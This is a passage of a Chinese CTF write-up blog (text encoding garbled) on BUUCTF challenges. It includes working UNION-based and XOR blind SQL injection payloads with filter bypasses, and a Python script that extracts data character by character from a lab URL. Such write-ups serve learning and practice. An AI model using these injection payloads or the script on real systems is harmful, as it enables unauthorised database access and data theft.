ä¸€èˆ¬è€Œè¨€ï¼Œid å±äºä¸»é”®æˆ–è€…å”¯ä¸€é”®ï¼Œé€šå¸¸ä¸ä¼šå­˜åœ¨ id ä¸º <span class="token operator">-</span><span class="token number">1</span> çš„è¡Œï¼Œæ‰€ä»¥è¿™ä¸ªæŸ¥è¯¢å¯èƒ½ä¸ä¼šè¿”å›ä»»ä½•ç»“æœã€‚ä¸è¿‡ï¼Œå®ƒçš„ç›®çš„æ˜¯è¦ä¿è¯å’Œç¬¬äºŒä¸ªæŸ¥è¯¢çš„åˆ—æ•°ä¸€è‡´ã€‚

ç¬¬äºŒä¸ªæŸ¥è¯¢
<span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x
è¿™ä¸ªæŸ¥è¯¢è¾ƒä¸ºå¤æ‚ï¼Œä¸‹é¢é€æ­¥æ‹†è§£ï¼š
å­æŸ¥è¯¢
<span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x
å­æŸ¥è¯¢çš„åŠŸèƒ½æ˜¯æŠŠä¸¤ä¸ªæŸ¥è¯¢ç»“æœåˆå¹¶ã€‚
ç¬¬ä¸€ä¸ªæŸ¥è¯¢ <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c ä¼šç”Ÿæˆä¸€è¡Œæ•°æ®ï¼Œè¿™ä¸€è¡Œæœ‰ä¸‰ä¸ªåˆ—ï¼Œåˆ†åˆ«å‘½åä¸º aã€bã€cï¼Œå®ƒä»¬çš„å€¼ä¾æ¬¡ä¸º <span class="token number">1</span>ã€<span class="token number">2</span>ã€<span class="token number">3</span>ã€‚
ç¬¬äºŒä¸ªæŸ¥è¯¢ <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users ä¼šä» users è¡¨ä¸­é€‰å–æ‰€æœ‰è¡Œã€‚
è¿™ä¸¤ä¸ªæŸ¥è¯¢çš„ç»“æœé€šè¿‡ <span class="token keyword">UNION</span> åˆå¹¶æˆä¸€ä¸ªä¸´æ—¶ç»“æœé›†ï¼Œå¹¶ä¸”ç»™è¿™ä¸ªä¸´æ—¶ç»“æœé›†èµ·äº†åˆ«å xã€‚

å¤–å±‚æŸ¥è¯¢
<span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>x
å¤–å±‚æŸ¥è¯¢ä»ä¸´æ—¶ç»“æœé›† x é‡Œé€‰å–æ•°æ®ã€‚
å‰ä¸¤åˆ—çš„å€¼åˆ†åˆ«ä¸ºå¸¸é‡ <span class="token number">1</span> å’Œ <span class="token number">2</span>ã€‚
ç¬¬ä¸‰åˆ—è¿ç”¨äº† GROUP_CONCAT å‡½æ•°ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨æ˜¯æŠŠ x è¡¨ä¸­ c åˆ—çš„æ‰€æœ‰å€¼è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™äº›å€¼ä¼šç”¨é€—å·åˆ†éš”ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½†é¦–å…ˆä¸çŸ¥é“åˆ—æ•°ï¼Œorderè¿˜è¢«banäº†ã€‚ã€‚ã€‚ä¸çŸ¥é“åªèƒ½æ…¢æ…¢selectäº†</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,3'</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8dddfbbccf96e390c83fc2d112b8cf98.png"></p>
<p><del>å—¯ï¼Œæ€»ä¹‹å°±å½“æˆ‘å‘äº†22æ¬¡å¹¿å‘Šå§ï¼ˆ</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/199fce82d5660ff4a41a2a611fbe68c8.png"></p>
<p>æ2ï¼</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span>
<span class="token comment">#web1</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'select `2` from (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 union select * from web1)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>but<img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ae864d3a7c4fa6df2981d8bc66e96eaf.png"></p>
<p>ä½†InnoDbå¼•æ“å¯</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'select `2` from (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 union select * from web1)'</span>
<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats <span class="token keyword">where</span> database_name<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
å¾—
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from mysql.innodb_table_stats where database_name="web1"'</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name="web1"'</span>
<span class="token comment">#æ‡’å¾—è½¬ä¹‰æˆ‘è¿™é‡Œæ‰‹åŠ¨åŠ çš„åŒå¼•å·hhh</span>
<span class="token comment">#ads,users</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x<span class="token punctuation">;</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'select `2` from (select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 union select * from web1)'</span>
å¾—
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),(select group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from ads)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span>

å…ˆè¯•äº†ads:
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,database(),(select/**/group_concat(x.e)/**/from/**/(select/**/(select/**/1)a,(select/**/2)b,(select/**/3)c,(select/**/4)d,(select/**/5)e/**/union/**/select/**/*/**/from/**/users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span>
ä»æ˜¯<span class="token comment">#The used SELECT statements have a different number of columns</span>
æˆ‘è¯•åˆ°fç»“æœå‘ç°æº¢å‡ºäº†ã€‚ã€‚ã€‚äºæ˜¯è¯•<span class="token keyword">user</span>
usersè¡¨çš„åˆ—æ•°æ­£å¥½æ˜¯<span class="token number">3</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,database(),(select group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</span>
<span class="token comment">#flag{ecbdd94b-681f-4293-9835-9cb932a63393}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ€åæ”¾ä¸‹payoad: <code>-1'union/**/select/**/1,database(),(select/**/group_concat(x.c)/**/from/**/(select/**/(select/**/1)a,(select/**/2)b,(select/**/3)c/**/union/**/select/**/*/**/from/**/users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</code>å“¦è€¶è€¶~</p>
<hr>
<h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h3><!--Log in as `admin`!-->

<!--We found the account cookie/monster-->

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/891c03279de5d67cbb68e7d0456240c5.png"></p>
<p>å•Šå“ˆï¼Ÿ</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/340c116a5c4220871a5b0b3e8410e63a.png"></p>
<p>è¿™ä¹Ÿå¤ªğŸ’¦äº†</p>
<hr>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h3><p>ç›²æ³¨+pythonï¼Œä¹Ÿæ˜¯æ‹‰æ»¡buffäº†</p>
<p>2ï¼š<del>ä¸€æ‹³ä¸€ä¸ªå˜¤å˜¤æ€ª</del></p>
<p>3ï¼š<del>æ»¡å±çº¢å­—å“æ­»äººäº†ï¼ˆ</del></p>
<p>5ï¼šè°¢è°¢æ¶¨è¯äº†navienavienavieå¤©çœŸçš„å¤©çœŸçš„å¤©çœŸçš„</p>
<p>è¿™æ˜¯è¿‡æ»¤äº†å•¥ï¼Œå’‹æœ‰çš„å¯æœ‰çš„ä¸å¯ï¼Ÿ</p>
<p>buerï¼Œè¿™usernameä¹Ÿå¤ªå“ˆäººäº†å§ï¼Œè¯´è¿™æ˜¯ç™½åå•ä¹Ÿä¸ä¸ºè¿‡ï¼ˆ</p>
<p>ç„¶åæƒ³åˆ°è®©æ‰¾ç¬¬å…­ä¸ªï¼Œé‚£è¯´æ˜å¥½åƒæ˜¯è¦æidï¼ˆbushi)å’³å’³</p>
<pre class="line-numbers language-none"><code class="language-none">Clever! But not this table.ç¿»è¯‘
=&gt;çœŸèªæ˜ï¼ä½†ä¸æ˜¯è¿™ä¸ªè¡¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>fuzzäº†ä¸€ä¸‹ï¼Œç©ºæ ¼å’Œæ³¨é‡Šç¬¦è¿˜æœ‰ä¸€äº›å…³é”®è¯è¢«banäº†ï¼Œå‘ç°â€™orâ€™=â€™orâ€™æˆ–TRUEä¼šè¿”å›id=1æ—¶çš„é¡µé¢ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SoporAeternus12/article/details/124001820">sqlæ³¨å…¥æ¼æ´ä¹‹å¼‚æˆ–æ³¨å…¥_sqlå¼‚æˆ–æ³¨å…¥-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vincy99/p/9642956.html">SQLæ³¨å…¥å­¦ä¹ æ€»ç»“(å…«):å…¶ä»–SQLæ³¨å…¥çš„å¼‚æˆ–æ³¨å…¥ - å“ˆå“ˆå“ˆ1014 - åšå®¢å›­</a></p>
<p>åˆ¤æ–­ä¸äº†åˆ—æ•°ï¼Œæˆ‘å°±ç›´æ¥æäº†</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">^</span><span class="token number">1</span><span class="token comment">--&gt;ture</span>
?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">--&gt;error</span>
?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token comment">--&gt;ture</span>

ä¸‹é¢ä¸ºè„šæœ¬å†…å®¹ï¼š
<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span>
<span class="token comment">#information_schema,performance_schema,test,mysql,geek</span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token string">'geek'</span><span class="token punctuation">)</span>
<span class="token comment">#F1naI1y,Flaaaaag</span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_name<span class="token operator">=</span><span class="token string">'Flaaaaag'</span><span class="token punctuation">)</span>
<span class="token comment">#id,fl4gawsl</span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_name<span class="token operator">=</span><span class="token string">'F1naI1y'</span><span class="token punctuation">)</span>
<span class="token comment">#id,username,password</span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>fl4gawsl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>Flaaaaag<span class="token punctuation">)</span>
<span class="token comment">#NO! Not this! Click others~~~,yingyingying~ Not this as well~~,Ohhh You find the flag read on!&lt;br/&gt;Ohhh You #find the flag read on!&lt;br/&gt;Ohhh You find the flag(ç„¶åæ˜¯å¾ªç¯)</span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>F1naI1y<span class="token punctuation">)</span>
<span class="token comment">#mygod,welcome,site,site,site,siteï¼ˆç¢ç¢å¿µï¼šé‚£å¾ˆsiteäº†ï¼‰,Syc,finally,flag  </span>

<span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>F1naI1y<span class="token punctuation">)</span>
<span class="token comment">#cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http:#//www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag{7cf79887-48e3-42a4-ae01-17a0cb33c188}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote_plus

<span class="token comment"># é…ç½®ç›®æ ‡ä¿¡æ¯</span>
target_url <span class="token operator">=</span> <span class="token string">"http://75388fa0-b0c7-4fc1-b201-295652d9481b.node5.buuoj.cn:81/search.php"</span>  <span class="token comment"># ç›®æ ‡URL</span>
param_name <span class="token operator">=</span> <span class="token string">"id"</span>  <span class="token comment"># å­˜åœ¨æ³¨å…¥çš„å‚æ•°å</span>
true_keyword <span class="token operator">=</span> <span class="token string">"NO! Not this! Click others~~~"</span>  <span class="token comment"># æ¡ä»¶ä¸ºçœŸæ—¶çš„é¡µé¢ç‰¹å¾</span>
max_length <span class="token operator">=</span> <span class="token number">500</span>  <span class="token comment"># æœ€å¤§çŒœæµ‹é•¿åº¦</span>


<span class="token keyword">def</span> <span class="token function">check_condition</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    å‘é€è¯·æ±‚å¹¶æ£€æŸ¥æ¡ä»¶æ˜¯å¦æˆç«‹
    :param payload: SQLæ¡ä»¶è¯­å¥ï¼ˆä¸å¸¦é—­åˆï¼‰
    :return: å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ¡ä»¶æ˜¯å¦æˆç«‹
    """</span>
    <span class="token comment"># æ„é€ å®Œæ•´Payloadå¹¶ç¼–ç </span>
    full_payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0^</span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string"> "</span></span>
    <span class="token comment">#ä½¿ç”¨ f - å­—ç¬¦ä¸²å¯ä»¥ç›´æ¥åœ¨å­—ç¬¦ä¸²ä¸­æ’å…¥å˜é‡çš„å€¼ï¼Œç›¸æ¯”äºä¼ ç»Ÿçš„å­—ç¬¦ä¸²æ ¼å¼åŒ–æ–¹æ³•ï¼ˆå¦‚ % æ ¼å¼åŒ–æˆ– str.format() æ–¹æ³•ï¼‰</span>
    encoded_payload <span class="token operator">=</span> quote_plus<span class="token punctuation">(</span>full_payload<span class="token punctuation">)</span>  <span class="token comment"># URL ç¼–ç </span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
            <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>target_url<span class="token punctuation">}</span></span><span class="token string">?</span><span class="token interpolation"><span class="token punctuation">{</span>param_name<span class="token punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_payload<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>
            timeout<span class="token operator">=</span><span class="token number">5</span>
        <span class="token punctuation">)</span>
        <span class="token keyword">return</span> true_keyword <span class="token keyword">in</span> response<span class="token punctuation">.</span>text
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] è¯·æ±‚å¤±è´¥: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">extract_data</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    ä½¿ç”¨äºŒåˆ†æ³•é€å­—ç¬¦æå–æ•°æ®
    :param query: SQLæŸ¥è¯¢è¯­å¥
    :return: æå–çš„å­—ç¬¦ä¸²
    """</span>
    result <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> max_length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        low<span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">126</span>
        <span class="token keyword">while</span> low <span class="token operator">&lt;=</span> high<span class="token punctuation">:</span>
            mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
            condition <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"((ascii(substr(</span><span class="token interpolation"><span class="token punctuation">{</span>query<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1)))&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">}</span></span><span class="token string">)"</span></span>
            <span class="token keyword">if</span> check_condition<span class="token punctuation">(</span>condition<span class="token punctuation">)</span><span class="token punctuation">:</span>
                low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>high<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment">#å½“ check_condition è¿”å› False æ—¶ï¼Œhigh ä¼šè¢«æ›´æ–°ä¸º mid - 1ã€‚æ‰€ä»¥ï¼Œç›®æ ‡å­—ç¬¦çš„ ASCII ç å®é™…ä¸Šå°±æ˜¯ high + 1ã€‚</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] å½“å‰è¿›åº¦: </span><span class="token interpolation"><span class="token punctuation">{</span>result<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment">#print("[+] æ­£åœ¨æå–æ•°æ®åº“åç§°...")</span>
    <span class="token comment">#db_name = extract_data("(select(group_concat(schema_name))from(information_schema.schemata)")</span>
    <span class="token comment">#print(f"[+] æ•°æ®åº“åç§°: {db_name}")</span>
    <span class="token comment">#information_schema,performance_schema,test,mysql,geek</span>

    <span class="token comment">#table_name = extract_data("(select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')")</span>
    <span class="token comment">#print(f"[+] è¡¨åç§°: {table_name}")</span>
    <span class="token comment">#F1naI1y,Flaaaaag</span>

    <span class="token comment">#column_name = extract_data("(select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')")</span>
    <span class="token comment">#print(f"[+] åˆ—åç§°: {column_name}")</span>
    <span class="token comment">#id,fl4gawsl</span>

    flag <span class="token operator">=</span> extract_data<span class="token punctuation">(</span><span class="token string">"(select(group_concat(id))from(F1naI1y)"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] å†…å®¹: </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token comment">#cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag{7cf79887-48e3-42a4-ae01-17a0cb33c188}</span>

<span class="token comment"># -*- coding: UTF-8 -*- #</span>
<span class="token triple-quoted-string string">"""
@filename:final SQL.py
@auther:qing
@time:2025-3-31
"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘åœ¨ç¼–å†™è„šæœ¬æ—¶ï¼Œåœ¨è®¾ç½®<code>low, high = 32, 126</code>æ—¶ä¸€å¼€å§‹èŒƒå›´æ˜¯ä»0åˆ°200ï¼ˆæƒ³ç€æ— æ‰€è°“ï¼‰ï¼Œä½†è¿™æ ·çˆ†å‡ºçš„ç»“æœä¼šæœ‰ä¹±ç ï¼Œå› æ­¤è¿˜æ˜¯è®¾ç½®åœ¨æ­£å¸¸èŒƒå›´å†…å§ã€‚</p>
<hr>
<h3 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h3><p>è¿™é¢˜çœŸæ— æ•Œäº†å§ï¼Œæˆ‘æ‰“ç®—å¤åˆ¶å»Bingä¸€ä¸‹ï¼Œç»“æœç›´æ¥è‡ªåŠ¨ç¿»è¯‘äº†ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">Resistance is futile! Bring back Futurella or we'll invade!  Also, the flag is flag{94accd60-8f06-4be2-8852-5bda9d9a0283}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>å¯èƒ½å°±æ˜¯style.cssåœ¨ä½œç¥Ÿ</p>
</blockquote>
<hr>
